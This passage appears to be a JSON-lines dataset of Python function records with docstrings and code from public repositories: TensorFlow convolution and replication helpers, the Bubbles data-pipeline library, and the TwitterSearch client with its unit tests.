"size": 1140}
{"docstring": "\"\"\"Pads the input along the spatial dimensions independently of input size.\n\nArgs:\n  inputs: A tensor of size [batch, channels, height_in, width_in] or\n    [batch, height_in, width_in, channels] depending on data_format.\n  kernel_size: The kernel to be used in the conv2d or max_pool2d operation.\n               Should be a positive integer.\n  data_format: The input format ('channels_last' or 'channels_first').\n\nReturns:\n  A tensor with the same format as the input with the data either intact\n  (if kernel_size == 1) or padded (if kernel_size > 1).\n\"\"\"\n", "func_signal": "def fixed_padding(inputs, kernel_size, data_format):\n", "code": "pad_total = kernel_size - 1\npad_beg = pad_total // 2\npad_end = pad_total - pad_beg\n\nif data_format == 'channels_first':\n    padded_inputs = tf.pad(inputs, [[0, 0], [0, 0],\n                                  [pad_beg, pad_end], [pad_beg, pad_end]])\nelse:\n    padded_inputs = tf.pad(inputs, [[0, 0], [pad_beg, pad_end],\n                                  [pad_beg, pad_end], [0, 0]])\nreturn padded_inputs", "path": "net\\cpn.py", "repo_name": "HiKapok/tf.fashionAI", "stars": 337, "license": "apache-2.0", "language": "python", "size": 1140}
{"docstring": "\"\"\"Replicated version of `model_fn` to be used instead.\"\"\"\n", "func_signal": "def replicated_model_fn(features, labels, mode, params=None, config=None):\n", "code": "feature_shards, label_shards = _split_batch(\n    features, labels, len(devices), device=consolidation_device)\ntower_specs = _get_loss_towers(\n    model_fn=model_fn,\n    mode=mode,\n    features=feature_shards,\n    labels=label_shards,\n    params=params,\n    loss_reduction=loss_reduction,\n    config=config,\n    devices=devices,\n    local_ps_devices=ps_devices)\n\nif mode == model_fn_lib.ModeKeys.TRAIN:\n  train_op = _minimize_towers(tower_specs)\n  return _train_spec(\n      tower_specs, train_op, aggregation_device=consolidation_device)\nelif mode == model_fn_lib.ModeKeys.EVAL:\n  return _eval_spec(tower_specs, aggregation_device=consolidation_device)\nelif mode == model_fn_lib.ModeKeys.PREDICT:\n  return _predict_spec(tower_specs, aggregation_device=consolidation_device)", "path": "tf_replicate_model_fn.py", "repo_name": "HiKapok/tf.fashionAI", "stars": 337, "license": "apache-2.0", "language": "python", "size": 1140}
{"docstring": "\"\"\"Performs a batch normalization using a standard set of parameters.\"\"\"\n# We set fused=True for a significant performance boost. See\n# https://www.tensorflow.org/performance/performance_guide#common_fused_ops\n", "func_signal": "def batch_norm(inputs, training, data_format, name=None):\n", "code": "return tf.layers.batch_normalization(\n    inputs=inputs, axis=1 if data_format == 'channels_first' else 3,\n    momentum=_BATCH_NORM_DECAY, epsilon=_BATCH_NORM_EPSILON, center=True,\n    scale=True, training=training, name=name, fused=_USE_FUSED_BN)", "path": "net\\detxt_cpn.py", "repo_name": "HiKapok/tf.fashionAI", "stars": 337, "license": "apache-2.0", "language": "python", "size": 1140}
{"docstring": "\"\"\"Populate replicated EstimatorSpec for `GraphKeys.PREDICT`.\"\"\"\n", "func_signal": "def _predict_spec(tower_specs, aggregation_device):\n", "code": "estimator_spec = _asdict(tower_specs[0])\nestimator_spec['mode'] = model_fn_lib.ModeKeys.PREDICT\n\nwith ops_lib.device(aggregation_device):\n  estimator_spec['predictions'] = _concat_tensor_dicts(\n      *[tower_spec.predictions for tower_spec in tower_specs])\n\n  export_outputs_dict = _dict_concat(\n      *[tower_spec.export_outputs for tower_spec in tower_specs])\n\n  export_outputs = {}\n  for name, export_output_list in six.iteritems(export_outputs_dict):\n    if isinstance(export_output_list[0], export_output_lib.PredictOutput):\n      export_outputs[name] = export_output_lib.PredictOutput(\n          outputs=_concat_tensor_dicts(*[\n              export_output.outputs for export_output in export_output_list\n          ]))\n    elif isinstance(export_output_list[0],\n                    export_output_lib.RegressionOutput):\n      export_outputs[name] = export_output_lib.RegressionOutput(\n          value=array_ops.concat(\n              [export_output.value for export_output in export_output_list],\n              axis=0))\n    elif isinstance(export_output_list[0],\n                    export_output_lib.ClassificationOutput):\n      scores = None\n      if export_output_list[0].scores is not None:\n        scores = array_ops.concat(\n            [export_output.scores for export_output in export_output_list],\n            axis=0)\n\n      classes = None\n      if export_output_list[0].classes is not None:\n        classes = array_ops.stack(\n            [export_output.classes for export_output in export_output_list],\n            axis=0)\n\n      export_outputs[name] = export_output_lib.ClassificationOutput(\n          scores=scores, classes=classes)\n\nestimator_spec['export_outputs'] = export_outputs\nreturn model_fn_lib.EstimatorSpec(**estimator_spec)", "path": "tf_replicate_model_fn.py", "repo_name": "HiKapok/tf.fashionAI", "stars": 337, "license": "apache-2.0", "language": "python", "size": 1140}
{"docstring": "\"\"\"Compute gradients, but first, if needed, scale the loss.\"\"\"\n", "func_signal": "def compute_gradients(self, loss, *args, **kwargs):\n", "code": "loss = _scale_loss(loss,\n                   self._graph_state().loss_reduction,\n                   self._graph_state().number_of_towers)\nreturn self._get_optimizer().compute_gradients(loss, *args, **kwargs)", "path": "tf_replicate_model_fn.py", "repo_name": "HiKapok/tf.fashionAI", "stars": 337, "license": "apache-2.0", "language": "python", "size": 1140}
{"docstring": "\"\"\"Strided 2-D convolution with explicit padding.\"\"\"\n# The padding is consistent and is based only on `kernel_size`, not on the\n# dimensions of `inputs` (as opposed to using `tf.layers.conv2d` alone).\n", "func_signal": "def conv2d_fixed_padding(inputs, filters, kernel_size, strides, data_format, kernel_initializer=tf.glorot_uniform_initializer, name=None):\n", "code": "if strides > 1:\n    inputs = fixed_padding(inputs, kernel_size, data_format)\n\nreturn tf.layers.conv2d(\n            inputs=inputs, filters=filters, kernel_size=kernel_size, strides=strides,\n            padding=('SAME' if strides == 1 else 'VALID'), use_bias=False,\n            kernel_initializer=kernel_initializer(),\n            data_format=data_format, name=name)", "path": "net\\cpn.py", "repo_name": "HiKapok/tf.fashionAI", "stars": 337, "license": "apache-2.0", "language": "python", "size": 1140}
{"docstring": "\"\"\"Pads the input along the spatial dimensions independently of input size.\n\nArgs:\n  inputs: A tensor of size [batch, channels, height_in, width_in] or\n    [batch, height_in, width_in, channels] depending on data_format.\n  kernel_size: The kernel to be used in the conv2d or max_pool2d operation.\n               Should be a positive integer.\n  data_format: The input format ('channels_last' or 'channels_first').\n\nReturns:\n  A tensor with the same format as the input with the data either intact\n  (if kernel_size == 1) or padded (if kernel_size > 1).\n\"\"\"\n", "func_signal": "def fixed_padding(inputs, kernel_size, data_format):\n", "code": "pad_total = kernel_size - 1\npad_beg = pad_total // 2\npad_end = pad_total - pad_beg\n\nif data_format == 'channels_first':\n    padded_inputs = tf.pad(inputs, [[0, 0], [0, 0],\n                                  [pad_beg, pad_end], [pad_beg, pad_end]])\nelse:\n    padded_inputs = tf.pad(inputs, [[0, 0], [pad_beg, pad_end],\n                                  [pad_beg, pad_end], [0, 0]])\nreturn padded_inputs", "path": "net\\detnet_cpn.py", "repo_name": "HiKapok/tf.fashionAI", "stars": 337, "license": "apache-2.0", "language": "python", "size": 1140}
{"docstring": "\"\"\"Aggregate local variables used in metrics into the first tower.\"\"\"\n", "func_signal": "def _reduce_metric_variables(number_of_towers):\n", "code": "if number_of_towers == 1:\n  return control_flow_ops.no_op(name='no_eval_metric_reduction')\n\nmetric_variables = ops_lib.get_collection(ops_lib.GraphKeys.METRIC_VARIABLES)\nvariables_per_tower = len(metric_variables) // number_of_towers\n\nif len(metric_variables) % number_of_towers != 0:\n  raise ValueError(\n      'Different `EstimatorSpec.eval_metric_ops` across `model_fn()` calls.'\n      ' Expected {} local variables, but got {} instead.'.format(\n          variables_per_tower * number_of_towers, len(metric_variables)))\n\n# `metric_variables` has the size of `variables_per_tower` x\n#  number_of_towers.  Each tower is produced by calling the same model_fn.\n#  First `variables_per_tower` correspond to the first tower.  Each such\n#  variable has an replica at the `(variables_per_tower * i)` position, where\n#  `i` is `[1.. number_of_towers]`.  We are going to add values from replicas\n#  to each variable of the first tower.  We then zero out replica values, so\n#  that `_reduce_metric_variables` operation is idempotent.  If a metric\n#  is then computed based on local variables from the first tower, then the\n#  resulting metric is an estimate for all `number_of_towers` towers.\nops = []\nfor i in range(0, variables_per_tower):\n  next_replica_id = i + variables_per_tower\n  replicas = [\n      metric_variables[replica_id]\n      for replica_id in range(next_replica_id, len(metric_variables),\n                              variables_per_tower)\n  ]  #  `replicas` doesn't contain the first-tower variable.\n\n  reduce_op = state_ops.assign_add(metric_variables[i],\n                                   math_ops.add_n(replicas))\n\n  with ops_lib.control_dependencies([reduce_op]):\n    for replica in replicas:\n      zeros_for_replica = array_ops.zeros(\n          array_ops.shape(replica), dtype=replica.dtype)\n      zero_out_replica_op = state_ops.assign(replica, zeros_for_replica)\n      ops.append(zero_out_replica_op)\n\nreturn control_flow_ops.group(*ops)", "path": "tf_replicate_model_fn.py", "repo_name": "HiKapok/tf.fashionAI", "stars": 337, "license": "apache-2.0", "language": "python", "size": 1140}
{"docstring": "\"\"\"A device setter that puts distributes Var/Ops to PS/workers.\"\"\"\n", "func_signal": "def _local_device_setter(worker_device, ps_devices, ps_strategy):\n", "code": "ps_ops = ['Variable', 'VariableV2', 'VarHandleOp']\n\ndef local_device_chooser(op):\n  current_device = framework_device.DeviceSpec.from_string(op.device or '')\n\n  node_def = op if isinstance(op, node_def_pb2.NodeDef) else op.node_def\n  if node_def.op in ps_ops:\n    ps_device_spec = framework_device.DeviceSpec.from_string(\n        '{}'.format(ps_devices[ps_strategy(op)]))\n\n    ps_device_spec.merge_from(current_device)\n    return ps_device_spec.to_string()\n  else:\n    worker_device_spec = framework_device.DeviceSpec.from_string(\n        worker_device or '')\n    worker_device_spec.merge_from(current_device)\n    return worker_device_spec.to_string()\n\nreturn local_device_chooser", "path": "tf_replicate_model_fn.py", "repo_name": "HiKapok/tf.fashionAI", "stars": 337, "license": "apache-2.0", "language": "python", "size": 1140}
{"docstring": "\"\"\"Convert simple data set field list into bubbles field list.\"\"\"\n", "func_signal": "def schema_to_fields(fields):\n", "code": "flist = []\nfor i, md in enumerate(fields):\n    if not \"name\" in md and not \"id\" in md:\n        raise MetadataError(\"Field #%d has no name\" % i)\n\n    name = md.get(\"name\")\n    if not name:\n        name = md[\"id\"]\n\n    storage_type = md.get(\"type\", \"unknown\")\n    if storage_type == \"any\":\n        storage_type = \"unknown\"\n\n    atype = DEFAULT_ANALYTICAL_TYPES.get(storage_type, \"typeless\")\n\n    field = Field(name,\n                  storage_type=storage_type,\n                  analytical_type=atype,\n                  label=md.get(\"title\"),\n                  description=md.get(\"description\"),\n                  info=md.get(\"info\"),\n                  size=md.get(\"size\"),\n                  missing_value=md.get(\"missing_value\"))\n    flist.append(field)\n\nreturn FieldList(*flist)", "path": "bubbles\\datapackage.py", "repo_name": "Stiivi/bubbles", "stars": 450, "license": "other", "language": "python", "size": 737}
{"docstring": "\"\"\"Assigns a label to the last node in the pipeline. This node can be\nlater refereced as `pipeline[label]`. This method modifies the\npipeline.\"\"\"\n", "func_signal": "def label(self, name):\n", "code": "self.labels[name] = self.node\nreturn self", "path": "bubbles\\execution\\pipeline.py", "repo_name": "Stiivi/bubbles", "stars": 450, "license": "other", "language": "python", "size": 737}
{"docstring": "\"\"\"Creates a clone of the pipeline. The clone is a semi-shallow copy,\nwith new graph and labels instances.  \"\"\"\n\n", "func_signal": "def clone(self):\n", "code": "clone = copy(self)\nclone.graph = copy(self.graph)\nclone.labels = dict(self.labels)\nreturn clone", "path": "bubbles\\execution\\pipeline.py", "repo_name": "Stiivi/bubbles", "stars": 450, "license": "other", "language": "python", "size": 737}
{"docstring": "\"\"\"Creates a new pipeline with `context`.  If no context is provided,\ndefault context is used.\n\nPipeline inherits operations from the `context` and uses context's\ndispatcher to call the operations. Operations are provided as\npipeline's methods:\n\n.. code-block:: python\n\n    p = Pipeline(stores={\"default\":source_store})\n    p.source(\"default\", \"data\")\n    # Call an operation within context\n    p.distinct(\"city\")\n\n    p.create(\"default\", \"cities\")\n    p.run()\n\n`name` is an optional user's pipeline identifier that is used for\ndebugging purposes.\n\n.. note::\n\n    You can set the `engine_class` variable to your own custom\n    execution engine class with custom execution policy.\n\n\"\"\"\n# We need the context to get number of operads for every argument\n# FIXME: is this really necessary?\n", "func_signal": "def __init__(self, stores=None, context=None, graph=None, name=None):\n", "code": "self.context = context or default_context\nself.stores = stores or {}\n\nself.graph = graph or Graph()\nself.name = name\n\n# Set default execution engine\nself.engine_class = ExecutionEngine\n\n# Current node\nself.node = None\nself.labels = {}\n\nself._test_if_needed = None\nself._test_if_satisfied = None", "path": "bubbles\\execution\\pipeline.py", "repo_name": "Stiivi/bubbles", "stars": 450, "license": "other", "language": "python", "size": 737}
{"docstring": "\"\"\"Create a branch that will be run before the pipeline is run. If the\ntest fails, then pipeline will not be run and an error will be raised.\nUse this to test dependencies of the pipeline and avoid running an\nexpensive process.\"\"\"\n\n", "func_signal": "def test_if_satisfied(self):\n", "code": "self._test_if_satisfied = Pipeline(self.stores, self.context)\nreturn self._test_if_satisfied", "path": "bubbles\\execution\\pipeline.py", "repo_name": "Stiivi/bubbles", "stars": 450, "license": "other", "language": "python", "size": 737}
{"docstring": "\"\"\"Forks the current pipeline. If `empty` is ``True`` then the forked\nfork has no node set and might be used as source.\"\"\"\n", "func_signal": "def fork(self, empty=None):\n", "code": "fork = Pipeline(self.stores, self.context, self.graph)\n\nif not empty:\n    fork.node = self.node\n\nreturn fork", "path": "bubbles\\execution\\pipeline.py", "repo_name": "Stiivi/bubbles", "stars": 450, "license": "other", "language": "python", "size": 737}
{"docstring": "\"\"\"Appends a node to the pipeline stream. The new node becomes actual\nnode.\"\"\"\n\n", "func_signal": "def _append_node(self, node, outlet=\"default\"):\n", "code": "node_id = self.graph.add(node)\nif self.node:\n    self.graph.connect(self.node, node, outlet)\nself.node = node\n\nreturn self", "path": "bubbles\\execution\\pipeline.py", "repo_name": "Stiivi/bubbles", "stars": 450, "license": "other", "language": "python", "size": 737}
{"docstring": "\"\"\"If `obj` is a data object, then it is set as target for insert. If\n`obj` is a string, then it is considered as a factory and object is\nobtained using :fun:`data_object` with `params`\"\"\"\n\n", "func_signal": "def insert_into_object(self, obj, **params):\n", "code": "if self.node is None:\n    raise BubblesError(\"Cannot insert from a empty or disconnected \"\n                        \"pipeline.\")\n\nif isinstance(obj, str):\n    node = ObjectFactoryNode(obj, **params)\nelse:\n    if params:\n        raise ArgumentError(\"params should not be specified if \"\n                            \"object is provided.\")\n    node = ObjectNode(obj)\n\nself._append_insert_into(node)\n\nreturn self", "path": "bubbles\\execution\\pipeline.py", "repo_name": "Stiivi/bubbles", "stars": 450, "license": "other", "language": "python", "size": 737}
{"docstring": "\"\"\"If `obj` is a data object, then it is set as source. If `obj` is a\nstring, then it is considered as a factory and object is obtained\nusing :fun:`data_object` with `params`\"\"\"\n", "func_signal": "def source_object(self, obj, **params):\n", "code": "if self.node is not None:\n    raise BubblesError(\"Can not set pipeline source: there is already \"\n                        \"a node. Use new pipeline.\")\n\nif isinstance(obj, str):\n    node = ObjectFactoryNode(obj, **params)\nelse:\n    if params:\n        raise ArgumentError(\"params should not be specified if \"\n                            \"object is provided.\")\n    node = ObjectNode(obj)\n\nself.graph.add(node)\nself.node = node\n\nreturn self", "path": "bubbles\\execution\\pipeline.py", "repo_name": "Stiivi/bubbles", "stars": 450, "license": "other", "language": "python", "size": 737}
{"docstring": "\"\"\"Collect dataset names.\"\"\"\n\n", "func_signal": "def _index_datasets(self):\n", "code": "self.resources = OrderedDict()\nfor package in self.packages:\n    if package.resource_count == 1:\n        name = package.name\n        if name in self.resources:\n            raise MetadataError(\"Two single-resource packages with the\"\n                                \" same name '%s'\" % name)\n        self.resources[name] = package.resources[0]\n    else:\n        for resource in package.resources:\n            name = \"%s.%s\" % (package.name, resource.name)\n            if name in self.resources:\n                raise MetadataError(\"Duplicate datapackage resource %s in \"\n                                    \"%s.\" % (resource.name, package.name) )\n            self.resources[name] = resource", "path": "bubbles\\datapackage.py", "repo_name": "Stiivi/bubbles", "stars": 450, "license": "other", "language": "python", "size": 737}
{"docstring": "\"\"\"Returns an execution plan of the pipeline as provided by the\nexecution engine. For more information see\n:meth:`ExecutionEngine.execution_plan`.  \"\"\"\n\n", "func_signal": "def execution_plan(self, context=None):\n", "code": "engine = self._get_engine(context)\nreturn engine.execution_plan(self.graph)", "path": "bubbles\\execution\\pipeline.py", "repo_name": "Stiivi/bubbles", "stars": 450, "license": "other", "language": "python", "size": 737}
{"docstring": "\"\"\"Return a fresh engine instance that uses either target's context or\nexplicitly specified other `context`.\"\"\"\n", "func_signal": "def _get_engine(self, context=None):\n", "code": "context = context or self.context\nengine = self.engine_class(context=context, stores=self.stores)\nreturn engine", "path": "bubbles\\execution\\pipeline.py", "repo_name": "Stiivi/bubbles", "stars": 450, "license": "other", "language": "python", "size": 737}
{"docstring": "\"\"\"Creates a temporary object that will append an operation to the\npipeline\"\"\"\n", "func_signal": "def __init__(self, pipeline, opname):\n", "code": "self.pipeline = pipeline\nself.opname = opname", "path": "bubbles\\execution\\pipeline.py", "repo_name": "Stiivi/bubbles", "stars": 450, "license": "other", "language": "python", "size": 737}
{"docstring": "\"\"\"Appends an `insert into` node.\"\"\"\n\n", "func_signal": "def _append_insert_into(self, target, **params):\n", "code": "insert = Node(\"insert\")\nself.graph.add(insert)\nself.graph.add(target)\nself.graph.connect(target, insert, \"target\")\nself.graph.connect(self.node, insert, \"source\")\n\nself.node = insert", "path": "bubbles\\execution\\pipeline.py", "repo_name": "Stiivi/bubbles", "stars": 450, "license": "other", "language": "python", "size": 737}
{"docstring": "\"\"\"Runs the pipeline in Pipeline's context. If `context` is provided\nit overrides the default context.\n\nThere are two prerequisities for the pipeline to be run:\n\n* *test if needed* \u2013 pipeline is run only when needed, only when the\n  test is satisfied. If the test is not satisfied\n  (`ProbeAssertionError` is raised), the pipeline is gracefully\n  skipped and considered successful without running.\n\n* *test if satisfied* - pipeline is run only when certain requirements\n  are satisfied. If the requirements are not met, then an exception is\n  raised and pipeline is not run.\n\nThe difference between *\"if needed\"* and *\"if satisfied\"* is that the\nfirst one test whether the pipeline did already run or we already have\nthe data. The second one *\"if satisfied\"* tests whether the pipeline\nwill be able to run successfuly.\n\n\"\"\"\n\n", "func_signal": "def run(self, context=None):\n", "code": "engine = self._get_engine(context)\n\nrun = True\nif self._test_if_needed:\n    try:\n        engine.run(self._test_if_needed.graph)\n    except ProbeAssertionError:\n        name = self.name or \"(unnamed)\"\n        self.context.logger.info(\"Skipping pipeline '%s', \"\n                                 \"no need to run according to the test.\" %\n                                 name)\n        run = False\n\nif run and self._test_if_satisfied:\n    try:\n        engine.run(self._test_if_satisfied.graph)\n    except ProbeAssertionError as e:\n        name = self.name or \"(unnamed)\"\n        reason = e.reason or \"(unknown reason)\"\n        self.context.logger.error(\"Requirements for pipeline '%s' \"\n                    \"are not satisfied. Reason: %s\" % (name, reason))\n        raise\n\nif run:\n    result = engine.run(self.graph)\nelse:\n    result = None\n\n\n# TODO: run self._test_successful\n# TODO: run self.rollback if not sucessful\n\nreturn result", "path": "bubbles\\execution\\pipeline.py", "repo_name": "Stiivi/bubbles", "stars": 450, "license": "other", "language": "python", "size": 737}
{"docstring": "# TODO: currently only local paths are supported\n", "func_signal": "def __init__(self, url):\n", "code": "if is_local(url) and not url.endswith(\"/\"):\n    url = url + \"/\"\n\nself.url = url\n\ninfopath = urljoin(url, \"datapackage.json\")\nmetadata = read_json(infopath)\nwith open(infopath) as f:\n    try:\n        metadata = json.load(f)\n    except Exception as e:\n        raise Exception(\"Unable to read %s: %s\"\n                        % (infopath, str(e)))\n\nself.name = metadata.get(\"name\")\nself._resources = OrderedDict()\nfor i, res in enumerate(metadata[\"resources\"]):\n    resource = DataPackageResource(self, res)\n    if not resource.name:\n        resource.name = \"resource%d\" % i\n\n    if resource.name in self._resources:\n        raise Exception(\"Duplicate resource '%s' in data package '%s'\"\n                        % (resource.name, self.name))\n    self._resources[resource.name] = resource", "path": "bubbles\\datapackage.py", "repo_name": "Stiivi/bubbles", "stars": 450, "license": "other", "language": "python", "size": 737}
{"docstring": "\"\"\"Appends a node that inserts into `objname` object in `store`.  The\nactual object will be fetched during execution.\"\"\"\n\n", "func_signal": "def insert_into(self, store, objname, **params):\n", "code": "if self.node is None:\n    raise BubblesError(\"Cannot insert from a empty or disconnected \"\n                        \"pipeline.\")\n\ntarget = StoreObjectNode(store, objname, **params)\nself._append_insert_into(target)\n\nreturn self", "path": "bubbles\\execution\\pipeline.py", "repo_name": "Stiivi/bubbles", "stars": 450, "license": "other", "language": "python", "size": 737}
{"docstring": "\"\"\"Create a branch that will be run before the pipeline is run. If the\ntest passes, then pipeline will not be run. Use this, for example, to\ndetermine whether the data is already processed.\"\"\"\n", "func_signal": "def test_if_needed(self):\n", "code": "self._test_if_needed = Pipeline(self.stores, self.context)\nreturn self._test_if_needed", "path": "bubbles\\execution\\pipeline.py", "repo_name": "Stiivi/bubbles", "stars": 450, "license": "other", "language": "python", "size": 737}
{"docstring": "\"\"\"Appends an operation (previously stated) with called arguments as\noperarion's parameters\"\"\"\n# FIXME: works only with unary operations, otherwise undefined\n# TODO: make this work with binary+ operations\n#\n#\n# Dev note:\n# \u2013 `operands` might be either a node - received throught\n# pipeline.node or it might be a pipeline forked from the receiver\n\n", "func_signal": "def __call__(self, *args, **kwargs):\n", "code": "operation = self.pipeline.context.operation(self.opname)\n\nif operation.opcount == 1:\n    # Unary operation\n    node = Node(self.opname, *args, **kwargs)\n    self.pipeline._append_node(node)\n\nelse:\n    # n-ary operation. Take operands from arguments. There is one less\n    # - the one that is just being created by this function as default\n    # operand within the processing pipeline.\n\n    operands = args[0:operation.opcount-1]\n    args = args[operation.opcount-1:]\n\n    # Get name of first (pipeline default) outlet and rest of the\n    # operand outlets\n    firstoutlet, *restoutlets = operation.operands\n\n    # Pipeline node - default\n    node = Node(self.opname, *args, **kwargs)\n    self.pipeline._append_node(node, firstoutlet)\n\n    # All operands should be pipeline objects with a node\n    if not all(isinstance(o, Pipeline) for o in operands):\n        raise BubblesError(\"All operands should come from a Pipeline\")\n\n    # Operands are expected to be pipelines forked from this one\n    for outlet, operand in zip(restoutlets, operands):\n        # Take current node of the \"operand pipeline\"\n        src_node = operand.node\n\n        # ... and connect it to the outlet of the currently created\n        # node\n        self.pipeline.graph.connect(src_node, node, outlet)\n\nreturn self.pipeline", "path": "bubbles\\execution\\pipeline.py", "repo_name": "Stiivi/bubbles", "stars": 450, "license": "other", "language": "python", "size": 737}
{"docstring": "\"\"\"Creates a store that contains collection of data packages. The\ndatasets are referred as `store_name.dataset_name`.\"\"\"\n\n", "func_signal": "def __init__(self, url):\n", "code": "if not is_local(url):\n    raise NotImplementedError(\"Remote package collections are \"\n                              \"not supported yet\")\n\nself.packages = []\n\npaths = []\nfor path in os.listdir(url):\n    path = os.path.join(url, path)\n    if not os.path.isdir(path):\n        continue\n\n    if not os.path.exists(os.path.join(path, \"datapackage.json\")):\n        continue\n\n    package = DataPackage(path)\n    self.packages.append(package)\n\nself.datasets = OrderedDict()\nself._index_datasets()", "path": "bubbles\\datapackage.py", "repo_name": "Stiivi/bubbles", "stars": 450, "license": "other", "language": "python", "size": 737}
{"docstring": "\"\"\" Returns itself and queries the Twitter API. Is called when using \\\nan instance of this class as iterable. \\\nSee `Basic usage <basic_usage.html>`_ for examples\n\n:param order: An instance of TwitterOrder class \\\n(e.g. TwitterSearchOrder or TwitterUserOrder)\n:param callback: Function to be called after a new page \\\nis queried from the Twitter API\n:returns: Itself using ``self`` keyword\n\"\"\"\n\n", "func_signal": "def search_tweets_iterable(self, order, callback=None):\n", "code": "if callback:\n    if not callable(callback):\n        raise TwitterSearchException(1018)\n    self.__callback = callback\n\nself.search_tweets(order)\nreturn self", "path": "TwitterSearch\\TwitterSearch.py", "repo_name": "ckoepp/TwitterSearch", "stars": 385, "license": "mit", "language": "python", "size": 312}
{"docstring": "\"\"\" Returns current amount of tweets available within this instance\n\n:returns: The amount of tweets currently available\n:raises: TwitterSearchException\n\"\"\"\n\n", "func_signal": "def get_amount_of_tweets(self):\n", "code": "if not self.__response:\n    raise TwitterSearchException(1013)\n\nreturn (len(self.__response['content']['statuses'])\n        if self.__order_is_search\n        else len(self.__response['content']))", "path": "TwitterSearch\\TwitterSearch.py", "repo_name": "ckoepp/TwitterSearch", "stars": 385, "license": "mit", "language": "python", "size": 312}
{"docstring": "\"\"\" Tests TwitterSearchOrder.set_since_id() \"\"\"\n\n", "func_signal": "def test_TSO_sinceID(self):\n", "code": "tso = self.getCopy()\ncorrect_values = [ self.generateInt(1,999999999) for x in range(0,10) ]\n\nfor value in correct_values:\n    tso.set_since_id(value)\n    cor = '%s&since_id=%i' % (self.__tso.create_search_url(), value)\n    self.assertEqualQuery(tso.create_search_url(), cor)\n\n# wrong values\nwrong_values = [-1, 1.0, '', [], {} ]\nfor value in wrong_values:\n    try:\n        tso.set_since_id(value)\n        self.assertTrue(False, \"Not raising exception for %s\" % value)\n    except TwitterSearchException as e:\n        self.assertEqual(e.code, 1004, \"Wrong exception code\")", "path": "tests\\test_tso.py", "repo_name": "ckoepp/TwitterSearch", "stars": 385, "license": "mit", "language": "python", "size": 312}
{"docstring": "\"\"\" Tests TwitterSearchOrder.set_include_entities() \"\"\"\n\n", "func_signal": "def test_TSO_inclEntities(self):\n", "code": "tso = self.getCopy()\ncorrect_values = [ True, False ]\nfor value in correct_values:\n    tso.set_include_entities(value)\n    cor = '%s&include_entities=%s' % (self.__tso.create_search_url(), bool(value))\n    self.assertEqualQuery(tso.create_search_url(), cor)\n\n# wrong values\nwrong_values = [ '', 3.0, 3, -1, 2, [], {} ]\nfor value in wrong_values:\n    try:\n        tso.set_include_entities(value)\n        self.assertTrue(False, \"Not raising exception for %s\" % value)\n    except TwitterSearchException as e:\n            self.assertEqual(e.code, 1008)", "path": "tests\\test_tso.py", "repo_name": "ckoepp/TwitterSearch", "stars": 385, "license": "mit", "language": "python", "size": 312}
{"docstring": "\"\"\" Sets a HTTPS proxy to query the Twitter API\n\n:param proxy: A string of containing a HTTPS proxy \\\ne.g. ``set_proxy(\"my.proxy.com:8080\")``.\n:raises: TwitterSearchException\n\"\"\"\n\n", "func_signal": "def set_proxy(self, proxy):\n", "code": "if isinstance(proxy, str if py3k else basestring):\n    self.__proxy = proxy\nelse:\n    raise TwitterSearchException(1009)", "path": "TwitterSearch\\TwitterSearch.py", "repo_name": "ckoepp/TwitterSearch", "stars": 385, "license": "mit", "language": "python", "size": 312}
{"docstring": "\"\"\" Tests TwitterSearchOrder.set_result_type() \"\"\"\n\n", "func_signal": "def test_TSO_result_type(self):\n", "code": "tso = self.getCopy()\ncorrect_values = [ 'recent', 'mixed', 'popular' ]\n\nfor value in correct_values:\n    tso.set_result_type(value)\n    cor = '%s&result_type=%s' % (self.__tso.create_search_url(), value)\n    self.assertEqualQuery(tso.create_search_url(), cor)\n\n# wrong values\ntry:\n    tso.set_result_type(self.generateString())\n    self.assertTrue(False, \"Not raising exception for %s\" % value)\nexcept TwitterSearchException as e:\n    self.assertEqual(e.code, 1003, \"Wrong exception code\")", "path": "tests\\test_tso.py", "repo_name": "ckoepp/TwitterSearch", "stars": 385, "license": "mit", "language": "python", "size": 312}
{"docstring": "\"\"\" Tests TwitterSearchOrder.set_max_id() \"\"\"\n\n", "func_signal": "def test_TSO_maxID(self):\n", "code": "tso = self.getCopy()\ncorrect_values = [ self.generateInt(1,999999999) for x in range(0,10) ]\n\nfor value in correct_values:\n    tso.set_max_id(value)\n    cor = '%s&max_id=%i' % (self.__tso.create_search_url(), value)\n    self.assertEqualQuery(tso.create_search_url(), cor)\n\n# wrong values\nwrong_values = [ -1, 1.0, '', [], {} ]\nfor value in wrong_values:\n    try:\n        tso.set_max_id(value)\n        self.assertTrue(False, \"Not raising exception for %s\" % value)\n    except TwitterSearchException as e:\n        self.assertEqual(e.code, 1004, \"Wrong exception code\")", "path": "tests\\test_tso.py", "repo_name": "ckoepp/TwitterSearch", "stars": 385, "license": "mit", "language": "python", "size": 312}
{"docstring": "\"\"\" Creates dicts out of given strings and compares those dicts \"\"\"\n\n", "func_signal": "def assertEqualQuery(self, *args):\n", "code": "d = []\nfor arg in args:\n    d += parse_qs(arg)\n\n# it's slower if assertsEqual is done when x == y as to avoid this case\n(self.assertEqual(x,y,'Query strings do NOT match') for x in d for y in d)", "path": "tests\\test_tso.py", "repo_name": "ckoepp/TwitterSearch", "stars": 385, "license": "mit", "language": "python", "size": 312}
{"docstring": "\"\"\" Tests the url encoding of TwitterSearchOrder.create_search_url() \"\"\"\n\n", "func_signal": "def test_TSO_search_encoding(self):\n", "code": "test_cases = [ 'test(', '[test' , 'foo$bar','plain', '==', '=%!' ]\n\nfor value in test_cases:\n    tso = TwitterSearchOrder()\n    tso.add_keyword(value)\n    cor = '?q=%s&count=%s' % (quote_plus(value),tso._max_count)\n    self.assertEqualQuery(tso.create_search_url(), cor)", "path": "tests\\test_tso.py", "repo_name": "ckoepp/TwitterSearch", "stars": 385, "license": "mit", "language": "python", "size": 312}
{"docstring": "\"\"\" Checks if given HTTP status code is within the list at \\\n ``TwitterSearch.exceptions`` and raises a ``TwitterSearchException`` \\\n if this is the case. Example usage: ``checkHTTPStatus(200)`` and \\\n ``checkHTTPStatus(401)``\n\n:param http_status: Integer value of the HTTP status of the \\\nlast query. Invalid statuses will raise an exception.\n:raises: TwitterSearchException\n\"\"\"\n\n", "func_signal": "def check_http_status(self, http_status):\n", "code": "if http_status in self.exceptions:\n    raise TwitterSearchException(http_status,\n                                 self.exceptions[http_status])", "path": "TwitterSearch\\TwitterSearch.py", "repo_name": "ckoepp/TwitterSearch", "stars": 385, "license": "mit", "language": "python", "size": 312}
